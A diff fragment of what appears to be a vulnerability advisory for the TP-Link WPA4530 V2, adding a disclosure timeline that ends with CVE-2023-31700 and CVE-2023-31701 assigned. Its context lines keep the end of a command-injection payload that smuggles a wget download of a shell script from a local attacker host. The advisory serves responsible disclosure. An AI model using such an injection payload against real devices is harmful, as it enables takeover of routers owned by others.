@@ -38,3 +38,10 @@ Cookie: Authorization=XXXXXXX
 
 xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh;
 ```
+
+## Disclosure
+
+* 2023-03-28: Report to TP-Link
+* 2023-04-14: TP-Link responses but WPA4530 V2 is EOL model, which is not maintained
+* 2023-04-15: Report to mitre
+* 2023-05-17: CVE-2023-31700 and CVE-2023-31701 assigned
